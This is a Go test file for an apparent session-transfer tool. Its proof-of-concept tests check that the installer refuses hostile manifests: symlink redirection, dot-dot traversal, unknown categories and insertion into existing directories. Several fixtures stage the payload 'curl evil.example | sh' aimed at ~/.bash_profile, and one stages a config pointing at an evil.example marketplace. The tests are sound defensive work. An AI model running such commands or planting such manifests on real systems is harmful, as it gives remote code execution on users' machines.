package transfer

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mithro/go-claude-teleport/internal/job"
	"github.com/mithro/go-claude-teleport/internal/session"
)

// The ruling R-P3-B1e PoCs. Every test here builds a manifest a hostile (or
// merely buggy) SOURCE could send and proves the DESTINATION refuses it
// before writing anything it cannot justify: the destination only ever
// writes CatSession under ConfigDir, CatCapture at this job's canonical
// capture path, and CatRepo/CatWorktree under a declared Root that passed
// real-path containment and provenance.

const pocJobID = "9d1c7f60-4f2a-4a51-9a2e-6c0f3b8d2e41"

// pocHost builds a destination sandbox: a home, its Paths and this job's
// staging dir (job.StagingDir(DataDir, jobID), exactly what
// remote.Local.stagingDir hands Diff/Install).
func pocHost(t *testing.T) (home string, p session.Paths, staging string) {
	t.Helper()
	home = filepath.Join(t.TempDir(), "home", "bob")
	if err := os.MkdirAll(home, 0o700); err != nil {
		t.Fatal(err)
	}
	p = session.Paths{
		Home:       home,
		ConfigDir:  filepath.Join(home, ".claude"),
		GlobalJSON: filepath.Join(home, ".claude.json"),
		DataDir:    filepath.Join(home, ".local", "share", "claude-teleport"),
	}
	return home, p, job.StagingDir(p.DataDir, pocJobID)
}

// declRoots builds the manifest's Roots field for a repo-mode (fresh-main /
// existing-main) manifest: roots that may NOT pre-exist populated.
func declRoots(paths ...string) []Root {
	var out []Root
	for _, path := range paths {
		out = append(out, Root{Path: path})
	}
	return out
}

// stageFile stages content for entry id and returns the entry fields Diff
// needs to classify it staged-same.
func stageFile(t *testing.T, staging string, id int, content string) (int64, string) {
	t.Helper()
	writeFile(t, StagedPath(staging, id), content)
	return int64(len(content)), sha(content)
}

func stageDir(t *testing.T, staging string, id int) {
	t.Helper()
	writeFile(t, StagedPath(staging, id)+".dir", "")
}

func stageSymlink(t *testing.T, staging string, id int, target string) {
	t.Helper()
	writeFile(t, StagedPath(staging, id)+".symlink", target)
}

func installOrRefuse(t *testing.T, m *Manifest, staging string, p session.Paths) error {
	t.Helper()
	st, err := Diff(context.Background(), m, staging, p)
	if err != nil {
		return err
	}
	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
	return err
}

// TestInstallRefusesUnknownCategory is PoC C1 (deny-by-name): validateDst
// only ever special-cased the categories it knew, so ANY other category —
// a typo, an empty string, a case variant, a trailing space — fell through
// to the bare "is it under $HOME" check and was placed. The category set is
// now an allow-list of the four byte-equal categories the spec names
// (§7.1), checked before anything else.
func TestInstallRefusesUnknownCategory(t *testing.T) {
	for _, cat := range []session.Category{"junk", "", "Pack", "worktree ", "pack"} {
		t.Run(strings.ReplaceAll(string(cat), " ", "_"), func(t *testing.T) {
			home, p, staging := pocHost(t)
			victim := filepath.Join(home, ".bash_profile")
			payload := "curl evil.example | sh\n"
			size, sum := stageFile(t, staging, 0, payload)
			m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Entries: []Entry{
				{ID: 0, Category: cat, Dst: victim, Size: size, Mode: 0o600, SHA256: sum},
			}}
			err := installOrRefuse(t, m, staging, p)
			if err == nil {
				t.Fatalf("category %q was installed at %s, want a refusal", cat, victim)
			}
			if !strings.Contains(err.Error(), victim) {
				t.Errorf("refusal does not name the entry: %v", err)
			}
			if _, serr := os.Lstat(victim); !os.IsNotExist(serr) {
				t.Errorf("%s was created (err %v)", victim, serr)
			}
		})
	}
}

// TestInstallRefusesSymlinkRedirectingALaterWrite is PoC C2 (a): entry 1 is
// a manifest symlink whose target is $HOME; entry 2's Dst is lexically
// under the declared Root but traverses that symlink, so the write landed
// on $HOME/.bash_profile. Both halves are now closed: an absolute symlink
// target is refused outright, and every placement re-resolves its parent
// with EvalSymlinks and must still be inside the Root.
func TestInstallRefusesSymlinkRedirectingALaterWrite(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "proj")
	victim := filepath.Join(home, ".bash_profile")
	payload := "curl evil.example | sh\n"
	stageDir(t, staging, 0)
	stageSymlink(t, staging, 1, home)
	size, sum := stageFile(t, staging, 2, payload)
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: root, Mode: uint32(os.ModeDir | 0o755)},
		{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(root, "link"), Mode: uint32(os.ModeSymlink | 0o777), Symlink: home},
		{ID: 2, Category: session.CatWorktree, Dst: filepath.Join(root, "link", ".bash_profile"), Size: size, Mode: 0o600, SHA256: sum},
	}}
	if err := installOrRefuse(t, m, staging, p); err == nil {
		t.Fatal("install must refuse a manifest symlink that redirects a later write")
	}
	if _, err := os.Lstat(victim); !os.IsNotExist(err) {
		t.Errorf("%s was created through the symlink (err %v)", victim, err)
	}
}

// TestInstallRefusesDstTraversingASymlinkWithDotDot is PoC C2 (b): the Dst
// "<root>/link/../evil.sh" CLEANS to "<root>/evil.sh" — so every lexical
// containment check passes — but placement used the raw Dst, and the
// kernel resolves link/.. through the symlink, landing the file outside
// $HOME entirely. A Dst that is not already its own filepath.Clean is now
// refused, and the parent is re-resolved before the write regardless.
func TestInstallRefusesDstTraversingASymlinkWithDotDot(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "proj")
	outside := filepath.Join(filepath.Dir(home), "evil.sh")
	payload := "curl evil.example | sh\n"
	stageDir(t, staging, 0)
	stageSymlink(t, staging, 1, home)
	size, sum := stageFile(t, staging, 2, payload)
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: root, Mode: uint32(os.ModeDir | 0o755)},
		{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(root, "link"), Mode: uint32(os.ModeSymlink | 0o777), Symlink: home},
		{ID: 2, Category: session.CatWorktree, Dst: root + "/link/../evil.sh", Size: size, Mode: 0o600, SHA256: sum},
	}}
	if err := installOrRefuse(t, m, staging, p); err == nil {
		t.Fatal("install must refuse a Dst that traverses a symlink with ..")
	}
	if _, err := os.Lstat(outside); !os.IsNotExist(err) {
		t.Errorf("%s was created outside $HOME (err %v)", outside, err)
	}
}

// TestInstallRefusesRootWithSymlinkedAncestor is PoC C3: validRoot was
// purely lexical, so a Root whose ANCESTOR is a symlink into the config dir
// passed every check ("proj" is not dot-prefixed, and lexically nothing is
// under ConfigDir) while every write under it landed in ~/.claude — here in
// the forbidden plugins/ tree. The Root's longest existing prefix is now
// resolved with EvalSymlinks before containment is judged.
func TestInstallRefusesRootWithSymlinkedAncestor(t *testing.T) {
	home, p, staging := pocHost(t)
	if err := os.MkdirAll(p.ConfigDir, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(p.ConfigDir, filepath.Join(home, "proj")); err != nil {
		t.Fatal(err)
	}
	root := filepath.Join(home, "proj", "plugins") // == <ConfigDir>/plugins
	payload := `{"marketplaces":{"evil":"https://evil.example"}}`
	stageDir(t, staging, 0)
	size, sum := stageFile(t, staging, 1, payload)
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: root, Mode: uint32(os.ModeDir | 0o755)},
		{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(root, "config.json"), Size: size, Mode: 0o600, SHA256: sum},
	}}
	if err := installOrRefuse(t, m, staging, p); err == nil {
		t.Fatal("install must refuse a Root whose ancestor is a symlink into the config dir")
	}
	if _, err := os.Lstat(filepath.Join(p.ConfigDir, "plugins")); !os.IsNotExist(err) {
		t.Errorf("<ConfigDir>/plugins was created (err %v)", err)
	}
}

// TestInstallRefusesInsertionIntoAPopulatedRoot is PoC I1: the name-subset
// freshness check asked only "is everything under the Root something this
// manifest also lists", so a manifest that also lists the directory's own
// existing file made the Root look fresh and INSERTED a new file into a
// directory this job never created. Freshness is now provenance: a Root is
// acceptable only if it is absent, or recorded in this job's own
// jobs/<id>/roots.json.
func TestInstallRefusesInsertionIntoAPopulatedRoot(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "work")
	readme := filepath.Join(root, "README")
	existing := "the user's own notes\n"
	writeFile(t, readme, existing)
	evil := filepath.Join(root, "evil.sh")
	payload := "curl evil.example | sh\n"
	size, sum := stageFile(t, staging, 1, payload)
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: readme, Size: int64(len(existing)), Mode: 0o600, SHA256: sha(existing)},
		{ID: 1, Category: session.CatWorktree, Dst: evil, Size: size, Mode: 0o700, SHA256: sum},
	}}
	if err := installOrRefuse(t, m, staging, p); err == nil {
		t.Fatal("install must refuse to insert into a root this job did not create")
	}
	if _, err := os.Lstat(evil); !os.IsNotExist(err) {
		t.Errorf("%s was created (err %v)", evil, err)
	}
	if got, _ := os.ReadFile(readme); string(got) != existing {
		t.Errorf("%s was modified: %q", readme, got)
	}
}

// TestInstallRerunsAgainstTheRootThisJobCreated is I1's other half: the
// provenance record (jobs/<id>/roots.json) is what makes the destination's
// own idempotent re-runs work — verifyInstall re-Diffs the whole manifest
// after a successful install, and a resumed job re-runs the very same
// steps, both against a Root that is now (correctly) non-empty.
func TestInstallRerunsAgainstTheRootThisJobCreated(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "github", "x")
	content := "package main\n"
	stageDir(t, staging, 0)
	size, sum := stageFile(t, staging, 1, content)
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: root, Mode: uint32(os.ModeDir | 0o755)},
		{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(root, "main.go"), Size: size, Mode: 0o644, SHA256: sum},
	}}
	if err := installOrRefuse(t, m, staging, p); err != nil {
		t.Fatalf("first install: %v", err)
	}
	if got, err := os.ReadFile(filepath.Join(root, "main.go")); err != nil || string(got) != content {
		t.Fatalf("main.go = %q err=%v", got, err)
	}
	// The root is now non-empty, and this is exactly what verifyInstall
	// and a resumed job do next.
	st, err := Diff(context.Background(), m, staging, p)
	if err != nil {
		t.Fatalf("re-diff: %v", err)
	}
	if st[1] != PresentSame {
		t.Errorf("re-diff status = %s, want %s", st[1], PresentSame)
	}
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatalf("re-install: %v", err)
	}
}

// TestInstallAcceptsAPrePopulatedNotARepoRoot is I2: not-a-repo mode's Root
// is the DRIVER user's chosen destination directory, which may legitimately
// pre-exist and hold unrelated files. Freshness does not apply there — the
// ordinary per-file rules do (absent creates, present-same skips,
// present-different blocks) — while every other Root rule still applies.
func TestInstallAcceptsAPrePopulatedNotARepoRoot(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "work")
	unrelated := filepath.Join(root, "notes.txt")
	existing := "the user's own notes\n"
	writeFile(t, unrelated, existing)
	content := "package main\n"
	size, sum := stageFile(t, staging, 0, content)
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid,
		Roots:   []Root{{Path: root, MayPreExist: true}},
		Entries: []Entry{{ID: 0, Category: session.CatWorktree, Dst: filepath.Join(root, "main.go"), Size: size, Mode: 0o644, SHA256: sum}},
	}
	if err := installOrRefuse(t, m, staging, p); err != nil {
		t.Fatalf("not-a-repo install: %v", err)
	}
	if got, err := os.ReadFile(filepath.Join(root, "main.go")); err != nil || string(got) != content {
		t.Fatalf("main.go = %q err=%v", got, err)
	}
	if got, _ := os.ReadFile(unrelated); string(got) != existing {
		t.Errorf("%s was modified: %q", unrelated, got)
	}
}

// TestDiffRefusalNamesTheEntryAndReason is I3: a root/category/symlink
// refusal must be DIAGNOSED at preflight as a refusal — naming the entry
// and why — never mistaken for an ordinary content collision (which is
// what present-different, and Blocking's list, mean).
func TestDiffRefusalNamesTheEntryAndReason(t *testing.T) {
	home, p, staging := pocHost(t)
	dst := filepath.Join(home, "work", "main.go")
	size, sum := stageFile(t, staging, 0, "package main\n")
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: dst, Size: size, Mode: 0o644, SHA256: sum},
	}}
	_, err := Diff(context.Background(), m, staging, p)
	var re *RefusalError
	if !errors.As(err, &re) {
		t.Fatalf("Diff err = %v, want a *RefusalError", err)
	}
	if len(re.Refusals) != 1 || re.Refusals[0].ID != 0 {
		t.Fatalf("refusals = %+v", re.Refusals)
	}
	if !strings.Contains(err.Error(), dst) || !strings.Contains(err.Error(), "root") {
		t.Errorf("refusal text does not name the entry and the reason: %v", err)
	}
}

// TestInstallEnsuresDirectoriesInsideAPreExistingRoot is ruling R-P3-B1e
// item 3's other half, and the shape existing-main teleports actually
// take: only git-attach's own Deferred entries and DIRECTORY entries reach
// Install there, and the Root is the destination's own pre-existing
// checkout. A directory entry is "ensure this directory exists" — it
// carries no content — so provenance does not gate it, while a file entry
// under the very same unrecorded root still is refused.
func TestInstallEnsuresDirectoriesInsideAPreExistingRoot(t *testing.T) {
	home, p, staging := pocHost(t)
	root := filepath.Join(home, "checkout")
	writeFile(t, filepath.Join(root, "README"), "the user's own repo\n")
	newDir := filepath.Join(root, "untracked-dir")
	stageDir(t, staging, 0)
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Roots: declRoots(root), Entries: []Entry{
		{ID: 0, Category: session.CatWorktree, Dst: newDir, Mode: uint32(os.ModeDir | 0o755)},
	}}
	if err := installOrRefuse(t, m, staging, p); err != nil {
		t.Fatalf("directory entry inside an existing checkout: %v", err)
	}
	if fi, err := os.Lstat(newDir); err != nil || !fi.IsDir() {
		t.Fatalf("%s = %v err=%v, want a directory", newDir, fi, err)
	}
	// The same root, a file entry: still refused.
	size, sum := stageFile(t, staging, 1, "curl evil.example | sh\n")
	m.Entries = append(m.Entries, Entry{ID: 1, Category: session.CatWorktree, Dst: filepath.Join(newDir, "evil.sh"), Size: size, Mode: 0o700, SHA256: sum})
	if err := installOrRefuse(t, m, staging, p); err == nil {
		t.Fatal("a file entry under an unrecorded pre-existing root must still be refused")
	}
	if _, err := os.Lstat(filepath.Join(newDir, "evil.sh")); !os.IsNotExist(err) {
		t.Errorf("evil.sh was created (err %v)", err)
	}
}

// TestInstallRefusesSessionSymlinkEscapingConfigDir covers ruling R-P3-B1e
// item 2a for the session category: the manifest legitimately carries
// symlinks (they are recorded, never followed, spec §7.1), but only ones
// that stay inside the boundary they belong to. A relative target that
// climbs out of the config dir is refused; the fixture's own
// "../<sid>.jsonl" link, which stays inside, is installed by
// TestInstallFreshDestination.
func TestInstallRefusesSessionSymlinkEscapingConfigDir(t *testing.T) {
	_, p, staging := pocHost(t)
	link := filepath.Join(p.ConfigDir, "projects", "-home-bob-work", "link.jsonl")
	stageSymlink(t, staging, 0, "../../../.bashrc")
	m := &Manifest{Version: 1, JobID: pocJobID, SessionID: sid, Entries: []Entry{
		{ID: 0, Category: session.CatSession, Dst: link, Mode: uint32(os.ModeSymlink | 0o777), Symlink: "../../../.bashrc"},
	}}
	err := installOrRefuse(t, m, staging, p)
	if err == nil || !strings.Contains(err.Error(), "symlink target") {
		t.Fatalf("err = %v, want a symlink-target refusal", err)
	}
	if _, err := os.Lstat(link); !os.IsNotExist(err) {
		t.Errorf("%s was created (err %v)", link, err)
	}
}
